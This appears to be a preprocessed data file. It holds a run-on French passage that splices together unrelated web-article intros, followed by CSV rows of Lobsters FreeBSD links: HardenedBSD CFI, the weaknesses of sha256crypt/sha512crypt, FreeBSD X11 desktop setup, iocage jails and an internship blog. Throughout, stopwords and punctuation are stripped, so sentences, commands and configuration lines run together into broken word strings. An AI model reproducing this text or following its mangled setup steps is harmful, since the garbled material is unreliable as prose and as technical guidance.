plus exportés au monde il en aussi bien de modèles pour hommes que pour femmes quels sont donc le avantages de cet vêtement c est ce que nous vous invitons à découvrir la conquête de nouveaux client reste pour tout administrateur de site web un objectif permanent pour toucher le marché international votre site doit répondre à plusieurs critères dont l un de plus importants est la traduction web quel est le véritable intérêt en termes de croissance de chiffre affaire améliorer l expérience utilisateur l internaute qui vient sur seulement disponible aux étatsunis pour le moment la nouvelle fonctionnalité de google devrait tout de même plaire à plusieurs google permet désormais de partager de image en format gif animé depuis la serp de votre moteur de recherche image vers autres application de gif dans toutes vos conversation qui n aime pa envoyer de gif pendant nombreuses sont le femmes qui ont régulièrement leurs menstruation toutes le quatre semaines rencontre aussi de femmes qui doivent attendre plusieurs mois avant de le avoir autres le voient arriver jours à peine après la fin de précédentes se demande ce qui pourrait engendrer une telle divergence entre le cycle menstruels le le protéines gamma gt sont indispensables dans le fonctionnement de membrane cellulaires cependant lorsque le taux de gamma gt devient important dans l organisme c est le début un problème de santé qu il faut immédiatement analyser cet article aborde le cause et conséquence du taux élevé de ce enzyme et propose quelques solution pour le diminuer le vous en avez marre de payer le loyer vous avez envie avoir votre propre maison ou mieux vous avez déjà trouvé la maison dont vous avez toujours rêvée mais vous avez de revenus moyens ou faibles vous empêchant de réaliser votre rêve sachez qu il de moyens pour avoir son propre logement sans sortir vous êtes certainement dans le désir acheter un bien immobilier ou vous avez déjà signé un compromis de vente présent ce qui fait votre cassetête c est la banque qu il faut choisir pour votre financement immobilier la question tourne autour du choix entre le gross banques ou le organismes régionaux il faut donc connaître le le cauchemar du harcèlement téléphonique hante tous le utilisateurs de cet outil de communication dans la recherche de solution contre ce fléau l annuaire inversé gratuit se révèle comme un dispositif technologique puissant pour le contrer cet article présente ce logiciel pratique disponible en ligne l annuaire inversé gratuit pour identifier le numéros de téléphone portable il vous avez une idée de projet et vous voulez créer votre entreprise vous avez convaincu de partenaires pour vous soutenir vous voulez démarquer votre entreprise de vos concurrents ou encore faire véhiculer de valeurs auprès de vos client vous désirez peutêtre simplement soigner l image de votre entreprise le tout commence par votre logo cet article une playlist est un ensemble de musiques ou de vidéos que l aime souvent écouter tout internaute peut en créer et en partager si vous avez envie de regrouper le musiques ou le vidéos le plus entraînants pour suivre votre séance de gym ou pour réussir votre soirée optez pour le playlist le présent article il vous est certainement déjà arrivé de perdre la clé de votre cadenas cherche alors à le déverrouiller par tous le moyens pour récupérer ce qui est enfermé vous recherchez de méthodes simple et rapide pour déverrouiller un cadenas sans code ou sans clé cet article vous fournira le nécessaire de quoi avez besoin l arrivée de l été marque souvent le début de la saison de feux artifice et la france peut se vanter en avoir parmi le plus beau du monde nous vous emmenons à découverte de quelquesuns de plus beau feux artifice de france le master de feu de compiègne débutons ce classement de feux artifice en france la ville de bonneville est un lieu au riche patrimoine touristique et artistique au cœur de la vallée de l arve dans la faucigny si vous n avez pa encore visité un coin du monde où la nature vous offre l opportunité de vivre une exceptionnelle expérience touristique cette ville doit être votre prochaine destination découvrez ici pourquoi
379,Lobsters,freebsd,FreeBSD,May 2018 Status Report: Cross-DSO CFI in HardenedBSD,https://github.com/lattera/articles/blob/master/hardenedbsd/2018-05-26_cross-dso-cfi/article.md,may status report crossdso cfi hardenedbsd,may status report crossdso cfi hardenedbsd enabled using llvm toolchain component building library lto sanitizers freebsd known issue limitation current status future work conclusion,may status report crossdso cfi hardenedbsd control flow integrity cfi raise bar attacker aiming hijack control flow execute arbitrary code llvm compiler toolchain included used default hardenedbsd support forwardedge cfi backwardedge cfi support gained via tangential feature called safestack crossdso cfi build upon aslr pax noexec effectiveness hardenedbsd support noncrossdso cfi base enabled individual port term noncrossdso cfi mean cfi enabled code within application codebase shared library depends supporting noncrossdso cfi important initial milestone supporting crossdso cfi cfi applied shared library application article discus hardenedbsd stand regard crossdso cfi base made lot progress yet even halfway update jul enabled noncrossdso cfi last night work crossdso cfi support also test brace article going full reference crossdso cfi make drinking game nt call using llvm toolchain component cfi requires compiling source file linktime optimization lto remembered hearing year back llvm developer able compile entirety freebsd source code lto compiling lto produce intermediate object file llvm ir bitcode instead elf object march started compiling application lto noncrossdso cfi also enabled ldlld default linker base since cfi requires lld commit made switch ldlld default linker enabling noncrossdso cfi time building library base requires application like ar ranlib nm objdump freebsd ar ranlib known bsd ar bsd ranlib fact ar ranlib application one hardlinked another application change behavior depending arvgv ending ranlib ar nm objdump used freebsd support llvm ir bitcode object file preparation crossdso cfi support commit october saw hardenedbsd switching ar ranlib nm objdump respective llvm component llvm version due support llvm ir bitcode object file surprise fallout port tree added llvmarunsafe friend help transition port dislike llvmar llvmranlib llvmnm llvmobjdump ldlld llvmar llvmranlib llvmnm llvmobjdump default hardenedbsd effectively switched full llvm compiler toolchain building library lto primary development branch hardenedbsd hardenedcurrentmaster build application lto mentioned secion first attempt building static shared library failed due issue within llvm reported issue freebsd ed maste emaste dimitry andric dim llvm rafael espindola expertly helped address issue various commits within llvm project rafael fully quickly resolved issue brought privately email llvm fixed could build nearly every library base lto noticed however kept noncrossdso cfi safestack enabled application would segfault even simplistic application like binls disabling noncrossdso cfi safestack keeping lto produced fully functioning world spent last month figuring enabling either noncrossdso cfi safestack caused issue brings u today sanitizers freebsd freebsd brought file required safestack cfi compiling safestack llvm statically link full sanitization framework application freebsd includes full copy sanitization framework safestack including common c sanization namespaces thus libclangrtsafestack included code meant shared among sanitizers safestack naively taken bruteforce approach setting libclangrtcfi static library copied makefile libclangrtsafestack used template libclangrtcfi approach incorrect due breaking one definition rule odr essentially ended including duplicate copy c class sanitizer runtime cfi safestack used crossdso cfi development vm safestack disabled acrosstheboard compiling cfi may ltoified world libs apps work limited testing binls crash anymore second major milestone crossdso cfi reached known issue limitation known issue regression note list known issue essentially also constitutes workinprogress every known issue fixed prior official launch crossdso cfi seems llvm like statically compiling application lto mixture c c code sbindevd one application crossdso cfi enabled devd compiled positionindependent executable pie break ufs system usr separate partition currently looking solving issue allow devd statically compiled noshared unset tool build stage aka bootstraptools crosstools related static compilation issue unsetting noshared tool build stage bandaid resolve static compliation lto one goal crossdso cfi integration work able support cfiicall scheme dlopen dlsym dlfunc used mean runtime linker rtld must enhanced know care cfi runtime enhancement currently implemented planned crossdso cfi enabled safestack disabled compiling crossdso cfi brings second copy sanitizer runtime violating one definition rule odr resolving issue straightforward unify sanitizer runtime single common library crossdso cfi safestack link installed world crossdso cfi enabled performing buildworld crossdso cfi disabled fails somewhat related static compilation issue described current status managed get crossdso cfi world booting bare metal development laptop vm application failed work curiously firefox still worked also mean xorg work working known issue list researching learning future work fixing pretty much everything known issue limitation section p need create static library includes single copy common sanitizer framework code application compiled cfi safestack single copy framework next need integrate support rtld crossdso cfi application cfiicall scheme enabled call function resolved dlsym currently crash due lack rtld support need make design decision whether support adding cfiicall whitelist entry dlfunc also whitelist cfiicall entry widely used dlsym likely item todo bucket currently aware treading uncharted territory firm eta bit work may gain crossdso cfi support looking like later either conclusion working crossdso cfi support hardenedbsd little year lot progress made yet still major hurdle overcome work already helped improve llvm hope commits upstream freebsd llvm happen getting closer able send preliminary call testing cft least would like solve static linking issue prior publishing cft expect published end would like thank ed maste dimitry andric rafael espindola help guidance support
380,Lobsters,freebsd,FreeBSD,Do Not Use sha256crypt / sha512crypt - They're Dangerous,https://pthree.org/2018/05/23/do-not-use-sha256crypt-sha512crypt-theyre-dangerous/,use dangerous,introduction history poulhenning kamp phk added freebsd address weakness descrypt descrypt passlib hash password character process hash every byte password demonstrated hashcat clustered nvidia gtx gpus nih syndrome ulrich drepper decided improve thing gnulinux already considered broken showing severe weakness subtle critical nist recommends character reason based nist guideline list aes various sha hash function ietf standard september december sp nt roll crypto mac o x openbsd usenix bcrypt bcrypt oneway cryptographic password hashing function blowfish twoway block symmetric cipher introduced bcrypt world doubtful scheme designed cryptographic point view graduate student computer science phd program encode digest colin percival tarsnap scrypt new adaptive password hashing function called scrypt tarsnap password hashing competition winner open public competition including favorite mine stackexchange fame bearssl algorithm conclusion par bcrypt update twitter thread solardiz includes acknowledgement,introduction like demonstrate think using current gnulinux operating system dangerous think developer glibc move scrypt least bcrypt history poulhenning kamp phk added freebsd address weakness descrypt common unix bsd system early descrypt core flaw de reversible necessarily nt problem incredibly fast also limited password length character limited ascii create de key phk created one thing made sure implement feature support arbitrarylength password word unlike descrypt user could password greater character good enough interesting feature nt think phk thought time execution time dependent password length prove wrote simple python script using passlib hash password started single character password increased password length appending password total time passlibhash import none xrange print pw start timeclock pw end timeclock end start open w f xrange fwrite n format nothing fancy start timer hash one stop timer record result start timer hash two stop timer record result wash rinse repeat password length timing result look like scatter plot timing password character length character character character first would nt think big deal fact may even think like supposed make thing get slower right good thing right upon deeper inspection actually flaw algorithm design two reason long password create denialofservice cpu larger concern passive observation execution time predict password length smaller concern fair predicting password length based execution time meh let honest bulk password character algorithm operate block size byte adversary learning aha know password character really nt saying much even exist cryptographic primitive probably still larger concern would user creating do cpu strictly changing password length know thinking reason practical length password adequately hashed insanely quickly right except invented year ago according phk designed take millisecond hardware testing would mean speed per second nt take much see increasing password length increase execution time enough affect busy authentication server question though execution time dependent password length process hash every byte password result creates stepping behavior see scatter plot good password hashing design would phk eventually sunset jeremi gosney professional password cracker demonstrated hashcat clustered nvidia gtx gpus password cracker could rip million guess per second longer implementing password hashing nih syndrome ulrich drepper decided improve thing gnulinux recognized threat gpu cluster even asics posed fast password cracking one aspect hardcoded iteration spent cpu password hash finalized cost configurable also already considered broken showing severe weakness moved core design first thing addressed make cost configurable hardware improved could increase iteration count thus keeping cost calculating final hash expensive password cracker however also made couple core change design differed ended rather drastic effect execution using code similar python passlib rather using function create scatter plot password total like weth fall take look character character character character character character curious see increasing execution time based password length unlike growth polynomial change ulrich drepper made subtle critical essentially process hash every character password per round like process every character password three time first take binary representation bit password length update hash based see second every character password update hash finally every character password update hash familiar bigo notation end execution run time pwlength iteration true want password hashing function slow also want iterative cost driving factor decision nt case case three case password length driving factor execution time iteration count problem remind long password create denialofservice cpu larger concern passive observation execution time predict password length smaller concern granted practice people nt carrying around kilobyte password web service provider probably nt want people uploading gigabyte password service creating network denial service would probably interested creating adequate password maximum nist recommends character prevent occurring however adequate iterative cost say round even moderately large password staff limit may imposed could create cpu denial service busy authentication server nt want find odd ulrich drepper design post say specification emphasis mine well problem already hear everybody complaining suffer nih syndrome reason people object make decision use also based nist guideline blowfish list nist therefore bcrypt solve problem list aes various sha hash function viable option aes variant based upon bcrypt sha variant could based variant currently implemented since solve problem consider solution equally secure went one involves le code solution use based sha precisely standardized ietf standard september full year ulrich drepper created password hashing function whole would blessed nist year later december sp based function mentioned already nist standard like special design based based said went one involves le code gone code already long since existed sort cryptographic software including openssl seems clear case nih syndrome sure understand wanting go bcrypt part nist standard nt roll crypto either algorithm already exist purpose based design part nist perform using similar python code passlib password hashing library trivial put together character character character clearly demonstrates factor driving execution time number iteration apply password delivering final password hash want achieve giving opportunity user create denialofservice based password length adversary learn length user password based execution time sort detail cryptographer cryptography expert would pay attention opposed enddeveloper worth pointing default password hashing function mac o x variable cost iteration typical default openbsd usenix bcrypt ulrich drepper brought bcrypt worth mentioning post first let get something straight bcrypt blowfish true bcrypt based blowfish two completely different cryptographic primitive bcrypt oneway cryptographic password hashing function blowfish twoway block symmetric cipher usenix conference niels provo david mazières openbsd introduced bcrypt world actually openbsd june critical stating following emphasis mine crypt hash password salt number different combination slow evaluation speed step algorithm make doubtful scheme designed cryptographic point view instance binary representation password length point determines data hashed every zero bit first byte password every set bit first byte previous hash computation phk slightly offended offhanded remark cryptography core consideration designing however niels provo graduate student computer science phd program university michigan time august earned phd since bcrypt withstood test time considered best practice hashing password still well received today even though better algorithm exist hashing password bcrypt limit password input byte one way around password limit prehashing common approach pseudocode hash password encode digest feed resulting ascii string bcrypt pseudocode pwhash bcrypt password result password including padding within bound byte bcrypt limitation prehashing allows user length password ever sending byte bcrypt implementation benchmark us method bcrypt compare execution time based password length bcrypt character prehashed bcrypt character prehashed bcrypt character prehashed fair bcrypt ever hashing byte password result prehashing course running constant time look hashing character password without prehashing bcrypt character raw see consistent execution driven entirely iteration cost password length colin percival tarsnap scrypt may mathematician dr colin percival presented new adaptive password hashing function called scrypt cpu expensive ram expensive well motivation even though bcrypt cpuintensive fpgas asics could built work password hash much quickly due requiring much ram around kb adding memory cost addition cpu cost password hashing function require fpga asic designer onboard specific amount ram thus financially increasing cost production scrypt recommends default ram cost least mb like think expensive function security obesity scrypt initially created expensive kdf backup service tarsnap tarsnap generates clientside encryption key encrypts data client shipping encrypted payload tarsnap server event client lost stolen generating encryption key requires knowing password created attempting discover password like typical password hashing function slow year post since dr percival introduced scrypt world like bcrypt withstood test time received continues receive extensive cryptanalysis showing critical flaw weakness among top choice recommendation security professional password hashing key derivation fare execution time per password length scrypt character scrypt character scrypt character seeing trend password hashing competition winner open public competition spirit aes held create password hashing function approached password security knew modern cryptography password security many interesting design submitted including favorite mine dr thomas pornin stackexchange fame bearssl used delegation reduce work load honest still making expensive password cracker july algorithm chosen winner competition come clean approach cpu memory hardness making parameter easy tweak test benchmark even though algorithm relatively new seen least year analysis writing quickly become gold standard password hashing fully recommend production use bet execution time affected password length let look character character character execution time affected password length imagine cryptographer know designing stuff conclusion ulrich drepper tried creating something secure par bcrypt ended creating something worse nt use dangerous hashing password order preference use appropriate cost scrypt cpu ram hard bcrypt cpu hard avoid practically everything else generic cryptographic hashing function etc complex homebrew iterative design iteration salted etc encryption design aes blowfish ugh etc update note brought twitter thread solardiz nt really upgrade upgrade really nt gpu resistant way bcrypt however bcrypt implemented cheaply asics kb memory choice password hashing constrained nist standard includes unfortunately bcrypt scrypt question make sure use properly includes choosing high iteration count based authentication load capacity point password storage probably worst security concern however limited nist constraint use others acknowledgement thanks steve thomas discussion twitter helping see quirky behavior
381,Lobsters,freebsd,FreeBSD,FreeBSD Desktop – Part 3 – X11 Window System,https://vermaden.wordpress.com/2018/05/22/freebsd-desktop-part-3-x11-window-system/,freebsd desktop part window system,freebsd desktop global page freebsd handbook xorg configuration bios uefi sysctl sysctl machdepbootmethod package pkg install xorg xdm xterm openbox group pw groupmod video username login class etcloginconf capmkdb etcloginconf default etcloginconf diff diff u loginconforg loginconf etcloginconf xinitrc grep lcall xinitrc kernel module drmnextkmod drmnextkmod http http svnwebfreebsdorgports viewrevision bootloaderconf etcrcconf etcrcconf bootloaderconf bootloaderconf zfsloadyes drmnextkmod etcrcconf grep kldlist etcrcconf grep kldlist etcrcconf http window system configuration cardconf cat ctrl alt backspace ctrl alt backspace cat cat xdm xinitstartx x x ln xinitrc xsession l l xsession xinitrc xdm black theme cat cat face fcmatch fcmatch courier xdm grey theme cat cat password client configuration xinitrc xinitrc xsession cat xinitrc update backend option seschwar lobster http grep devd update using driver reddit cat cat cat intel grep c intel grep c modeset grep dri modesetting grep c intel grep c modeset grep dri update using dedicated login class instead global one lorenzo video video default lang charset etcloginconf capmkdb etcloginconf grep vuk etcmasterpasswd video vuk pw usermod l video n vuk grep vuk etcmasterpasswd like,article would like cover setting window system freebsd may want check article freebsd desktop series freebsd desktop global page find link episode series along table content episode content always get impression configurationsetup seems seen hard weird try gather useful information topic regarding freebsd operating system lot covered freebsd handbook xorg configuration section bios uefi first thing first find device supported accelerated driver like intel nvidia would use vesa driver video electronics standard association booting bios mode use scfb driver system console frame buffer booting uefi mode checked machdepbootmethod sysctl parameter sysctl machdepbootmethod machdepbootmethod bios way know use scfb driver vesa driver troubleshooting running arm system scfb used package install server xdm login manager xterm terminal emulator openbox window manager also install intel graphic card driver achieve type command pkg install xorg xdm xterm openbox course need network connection configured covered earlier part group hardware accelerated also need add regular user video group pw groupmod video username login class remember also add default encoding charset lang parameter etcloginconf file show also adding run capmkdb etcloginconf command root relogin regular user shown line need added default profile etcloginconf file default copyrightetccopyright welcomeetcmotd setenvmailvarmail blocksizek pathsbin bin usrsbin usrbin usrlocalsbin usrlocalbin bin nologinvarrunnologin cputimeunlimited datasizeunlimited stacksizeunlimited memoryuseunlimited filesizeunlimited coredumpsizeunlimited openfilesunlimited maxprocunlimited sbsizeunlimited vmemoryuseunlimited swapuseunlimited pseudoterminalsunlimited kqueuesunlimited umtxpunlimited ignoretime diff afterbefore modification look like diff u loginconforg loginconf loginconforg loginconf umtxpunlimited ignoretime encoding lang parameter etcloginconf file must added begining xinitrc file like grep lcall xinitrc set proper locale lcall variable export kernel module intel introduced nehalem architecture integrated gpu cpu memory controller amd cpu since mean computerslaptopsservers intel market share integrated gpu supported intel driver base system odler base system newer drmnextkmod package drmnextkmod package available freebsd development branch upcoming freebsd currently stage read freebsd mailing list http http svnwebfreebsdorgports viewrevision accordingly probably using builtin km module file may configure loading module either bootloaderconf loaded boot menu etcrcconf main freebsd configuration file load module startup process prefer second option faster freebsd system boot loading kernel module etcrcconf file along starting needed service lading one one bootloaderconf file keep system startup time minimum one kernel module configured load bootloaderconf file zfs module zfsloadyes line found situation km module base system support graphic card try drmnextkmod package latest support intel graphic chip sometimes requires running freebsd current version problem get new stuff instantly bonus add km kernel mode setting intel module loading etcrcconf file put line kernel module kldlist kldlist also add useful kernel module loading fuse alien filsystems aesni encryption acceleration cpu extension geomeli encryption coretemp temperature sensor cover kernel module future series exact explanation etcrcconf kldlist variable look like grep kldlist etcrcconf kldlist kldlist aesni geomeli kldlist kldlist fuse coretemp cpuctl case need use drmnextkmod module instead base system one etcrcconf file would look like one grep kldlist etcrcconf kldlist kldlist aesni geomeli kldlist kldlist fuse coretemp cpuctl find situation drmnextkmod would still support latest graphic card may try latest version drmnextkmod current drmnextkmod par linux come graphic support latest wip work progress tree may enable graphic card anyway http use risk window system configuration historically would create entire file would include complete window system configuration recently comply freebsd hier directory structure logic also configured file even recently configure part server need without touching part individual configuration done directory individual file setting like cardconf graphic card configuration latter method modern one use guide sake future installation cat section serverflags option dontzap endsection dontzap option enable server abort ctrl alt backspace shortcut found useful several time none option worked server required restart could course login laptop via ssh kill needed process carry two laptop prepared situation next configure keyboard polish layout two additional option terminate ctrlaltbksp allow termination server ctrl alt backspace shortcut ctrl nocaps ignore cap lock key also find useful enable option cat section inputdevice identifier driver kbd option xkblayout pl option xkboptions terminate ctrlaltbksp ctrl nocaps endsection last one graphic card configuration put intel graphic fully supported cat section device identifier option dpms driver intel endsection remember enable sna acceleration method option accelmethod sna intel driver card prevents suspendresume working also enable dpms save power possible xdm xinitstartx also decide want start window server may login plan text console type xinit startx read xinitrc configuration daemon may want use login manager xdmsddmslim xsession configuration load successful login difference xinit startx startx command executes xinit command argument like nolisten tcp listen external connection example pointless start another layer binary startx pas argument command omit startx go directly xinit command suitable alias better login manager directly starting xinit good depends preference example used text login typed x alias xinit command recently switched xdm along symlink xsession lead xinitrc file also like use xinit directly start server use alias xinit parameter alias xxinit xinitrc dpi nolisten tcp course keep alias zshrc file zsh shell everytime login text console type x session start reading content xinitrc file xinit run command based xinitrc file xdm login manager look xsession file loading stuff regardless startup method create link xsession pointing xinitrc file way either method choose always end started session ln xinitrc xsession l l xsession lrwxrxrx vuk vuk xsession xinitrc one case xinitrc xsession file interpreted shell script yes ifthenelsefi caseesac forwhile posix shell scripting need executable last command file must put background must without char end session end xdm black theme prepared two nice looking theme xdm login manager first one us black background greywhite font configure black xdm theme need modify content two file show cat xsetroot solid black set black background login screen server default one cat xloginlogingreeting xloginloginunsecuregreeting xloginloginfail fail xloginloginchangepasswdmessage change xloginloginnameprompt username xloginloginpasswdprompt password xloginloginechopasswd true xloginloginbackground black xloginloginforeground white xloginloginfailcolor cccccc xloginlogininpcolor black xloginloginpromptcolor aaaaaa xloginloginface courier stylebold xloginloginfailface courier stylebold xloginloginpromptface courier stylenormal xloginlogingreetface courier xloginloginwidth rest xdm login manager configuration kept xresources file least appearance part wonder font chosen put courier face option let check fcmatch command fcmatch courier courier pitch regular answer always type whole font name configuration file screenshot black theme action xdm grey theme liked black xdm theme maybe grey one suit taste better cat xsetroot solid use predefined server color background cat xloginlogingreeting xloginloginunsecuregreeting xloginloginfail fail xloginloginchangepasswdmessage change xloginloginnameprompt username xloginloginpasswdprompt password xloginloginechopasswd true xloginloginbackground xloginloginforeground white xloginloginfailcolor dddddd xloginlogininpcolor xloginloginpromptcolor cccccc xloginlogingreetcolor xloginloginpromptcolor xloginloginhicolor xloginloginshdcolor xloginloginface courier stylebold xloginloginfailface courier stylebold xloginloginpromptface courier stylebold xloginlogingreetface courier stylebold xloginloginframewidth xloginlogininnerframeswidth xloginloginsepwidth xloginloginwidth xloginloginheight xloginloginx xloginloginy knowing xdm theming limitation customize mimic fullscreen grey color downside approach username password field placed topleft side screen screenshot grey theme action client configuration last least configure simple xinitrc file openbox window manager prestarted xterm terminal black background simple session content xinitrc file xsession link course cat xinitrc set proper locale lcall variable export prestarted apps xterm xsetroot solid black window manager openbox pretty yet cover later series today configuration hope useful update devd backend autoadddevices option user seschwar lobster suggested xorg devd backend use get informed hotplugged device instead hald http working fine even without moused thank information may also verified checking log file grep devd ii server relies devd provide list input device device become available reconfigure devd disable autoadddevices ii configdevd probing input device ii configdevd adding input device null devkbdmux option configinfo devd kbdmux ii configdevd kbdmux enabled ignoring device ii configdevd kbdmux enabled ignoring device ii configdevd adding input device null devsysmouse option configinfo devd sysmouse ii configdevd device already opened ii configdevd device already opened modify original post confuse future reader update using modesetting driver user reddit suggested use kernel module need install modesetting generic ddx driver built x server well might even cause trouble mentioned example rebooting instead suspending installed installed solve tearing problem using sna acceleration removed suspends problem thank information tried configuration modesetting driver work without problem issue intel driver either stick modesetting driver see behaves machine cat section device identifier option dpms driver modesetting endsection cat section serverflags option dontzap endsection cat section inputdevice identifier driver kbd option xkblayout pl option xkboptions terminate ctrlaltbksp ctrl nocaps endsection verify driver use check log file intel driver used grep c intel grep c modeset grep dri ii intel setup complete ii intel dri driver ii intel vdpau driver vagl ii intel enabled ii intel disabled ii glx initialized gl provider screen modesetting driver used grep c intel grep c modeset grep dri ii glamor egl version ii modeset setup complete ii modeset dri driver ii modeset vdpau driver ii glx initialized gl provider screen update using dedicated video login class instead global one lorenzo suggested comment modify etcloginconf modifying systemwide locale default login class user belong also user www apache example course created dedicated login class window system use group video already create video login class window system assume default login class untouched already modified lang charset option remove add login class etcloginconf file video tcdefault rebuild login class database capmkdb etcloginconf account look setting login class grep vuk etcmasterpasswd vuk removed vuk homevuk binsh let set login class video vuk user pw usermod l video n vuk account look setting login class grep vuk etcmasterpasswd vuk removed vuk homevuk binsh logout login make work hope help eof like like loading related
382,Lobsters,freebsd,FreeBSD,Create FreeNAS Jails with IOCAGE.,https://www.cyberciti.biz/faq/how-to-create-freenas-jails-with-iocage/,create freenas jail iocage,step login freenas server step fetch version freebsd jail usage step create freenas jail iocage command list jail start jail named backup automatically start jail freenas reboots login jail step useful jail management command show resource usage jail run command inside specified jail stop specified jail restart specified jail destroydeleteremove specified jail run freebsdupdate update specified jail latest patch level summary command create new jail freenas add new user install rsnapshot package creating jail run openvpn server client connect ubuntu openvpn server conclusion latest tutorial sysadmin linuxunix open source topic via rssxml feed weekly email newsletter,install use freebsd jail manage called iocage freenas server command line create freenas jail iocage command iocage jail container manager tool freebsd also available freenas based na system come best feature technology freebsd operating system offer iocage tool provides ease use simple easy understand command syntax managing jail page show manage freenas jail iocage command line option advertisement step login freenas serveruse ssh command ssh user freenasboxname ssh vivek become root user using sudo command sudo find freenas server ip address interface name enter ifconfig please note real network interface must activate ie set zpool active iocage usage zpool name nixcraft use zpool list get list zpool run iocage activate nixcraftstep fetch version freebsd jail usagetype following command need done iocage fetch use following zpoolzfs command verify zpool list zfs list step create freenas jail iocage commandcreate jail named backup ip address jail interface named iocage create n backupjail r sample output backup successfully created list jailsto list newly created jail run iocage list sample output jid name state release backupjail start jail named backup iocage start jailnamehere iocage start backupjail sample output starting backupjail started ok starting service ok automatically start jail freenas reboots iocage set booton backupjail sample output property boot updated verify iocage get backupjail le iocage get backupjail grep boot iocage get boot backupjailhow login jailsthe syntax iocage console yourjailnamehere iocage console backupjail logged install pkg command backupjail pkg step useful jail management commandslet u see useful iocage commandsshow resource usage jail iocage df run command inside specified jail iocage exec jailnamehere freebsdcommandhere iocage exec backupjail ifconfighow stop specified jail iocage stop iocage stop backupjailrestart specified jail iocage restart iocage restart backupjaildestroydeleteremove specified jail destroyte data careful iocage destroy backupjailrun freebsdupdate update specified jail latest patch level iocage update backupjail sample jail summary command create new jail freenascreate jail named rsyncjail iocage create release name rsyncjail boot allowrawsockets resolver nameserver nameserver jail update package enable sshd add new user install rsnapshot package iocage console rsyncjail pkg update pkg upgrade echo sshdenable yes etcrcconf service sshd start pw useradd n vivek g wheel bintcsh homevivek passwd vivek pkg install rsnapshotcreating jail run openvpn server clientin following example going enable vnet allow ping via raw socket openvpn client jail connect ubuntu openvpn server iocage create release name openvpnjail vnet boot allowrawsockets defaultrouter resolver nameserver nameserver run following command allow creation tap device freebsdfreenas jail sbindevfs rule add path tun unhide please note must add following pre init task freenas ui openvpn create tap device usually install jail per service example create jail freebsd service nginxphpperlpython web service mariadb database server deluge duplicityrsnapshot backup service moreconclusionand created jail automatically start freenas system info see official freenas doc iocage command doc hereposted vivek gite author creator nixcraft seasoned sysadmin devops engineer trainer linux operating systemunix shell scripting get latest tutorial sysadmin linuxunix open source topic via rssxml feed weekly email newsletter advertisement
383,Lobsters,freebsd,FreeBSD,Why does FreeBSD have virtually no (0%) desktop market share?,https://www.quora.com/Why-does-FreeBSD-have-virtually-no-0-desktop-market-share,freebsd virtually desktop market share,,please enable javascript refresh page continue
384,Lobsters,freebsd,FreeBSD,What I Learned During My FreeBSD Internship,https://www.freebsdfoundation.org/blog/guest-blog-what-i-learned-during-my-freebsd-internship/,learned freebsd internship,liked learned closing thought,hi name mitchell horne computer engineering student university waterloo currently third year study fortunate one freebsd foundation coop student past term january april time worked ed maste foundation small kitchener office along another coop student arshan khanifar term come end like share little bit experience newcomer freebsd opensource development begin quick background small admission guilt opensource user large part life teenager started playing around linux opened eye wider world free software small contribution gnome experience mostly end user however value project opensource philosophy lost motivated interest position beginning term personal experience bsds although knew existence extremely excited receive position knew would great opportunity growth must confess naivety freebsd caused make silent assumption would form compromise stepping stone would eventually allow work opensource project somehow greater legitimate four month spent immersed project learned operates witnessed community learned history happy admit completely mistaken saying seems obvious freebsd project distinct us goal identity many may exist greater opportunity work freebsd full time know would hard time coming project legitimate liked case work submitted term reviewed le two people committed feedback criticism received always constructive point commented everything highlevel idea small style issue appreciate thorough review place since believe ultimately encourages people accept best work indicative high quality already exists within every aspect project commitment quality something continue honored core value discovered previous work term easy cut corner name deadline changing priority fact freebsd need make type compromise testament power free software small thing quality completeness freebsd documentation hugely helpful throughout term everything might need know utility library function kernel found man page handbook great resource introduction operating system reference wish taken time earlier term explore different document thoroughly cover wide range interesting useful topic effort people put writing maintaining freebsd documentation easy overlook value overstated learned although lot enjoyed certainly many struggle faced throughout term lesson learned expect issue faced may specific freebsd others may common opensource project general enough experience speculate leave reader first lesson summed simply advocate work freebsd made large part volunteer effort many case work go around people available consequence anybody check even position actually direct supervisor ed often plate full many thing responsibility find someone look work fell admittedly couple smaller change worked got left behind stuck review simply clear personplace reach think barrier entry freebsd mental hurdle needed get change want see included reviewed may one push nothing wrong perhaps process easier newcomer infrequent contributor disconnect bugzilla phabricator definitely leaf lot desired also aware simply reality right getting work looked may require little bit selfmotivation argue much worse problem project like freebsd could understand lot better still something struggle naturally type person easily connects others asks help see area future growth rather simply struggle encountered overcame course work term certainly important skill understand value work equally important ability communicate value others also learned importance starting small first week two job mainly involved getting set comfortable workflow initial stage began exploring project found overwhelmed scale many possible area investigate much work happening felt quite lost begin many potential project found far beyond experience level small bug picked fixed quickly experienced contributor could even get easy make mistake freebsd made solely rockstar committers everything appears facevalue reading commits bug report mailing list yield name reality important hundred user infrequent contributor take time submit bug report patch feedback even though people would fall umbrella rockstar committer get overnight rather built skill knowledge many year involvement freebsd similar project student coming project high expectation easy set bar high comparing big committers feel work insignificant inadequate simply infrequent reality reason felt way way comparison disrespectful reached level took long time get humbling reminder skill worth learning requires time patience dedication easy focus end product simply wish order truly successful one must start small find satisfaction struggle learning something new take pride many small success throughout term appreciate fact journey freebsd opensource software beginning closing thought would like close brief thankyou first everyone foundation helpful allowing position exist first place extremely grateful given unique opportunity learn give back opensource world also like thank office mate ed excellent mentor offered endless wealth knowledge willingness share classmate fellow intern arshan giving sense camaraderie comforting reminder many moment lost finally quick thanks everyone else crossed path offered review advice appreciate help look forward working walking away coop much greater appreciation project made goal remain involved capacity feel gained little bit wider perspective place software world something never really got previous coop whether end stepping stone beginning much larger involvement thoroughly enjoyed time thank reading mitchell horne
385,Lobsters,freebsd,FreeBSD,ZFS User Conference 2018,https://vimeo.com/album/5150026,zfs user conference,,
386,Lobsters,freebsd,FreeBSD,FreeBSD Presentations and Papers,https://papers.freebsd.org/,freebsd presentation paper,navigation freebsd presentation paper,navigation freebsd presentation paper collected work freebsd community presented various conference summit please send pull request http githubcomfreebsdfreebsdpapers
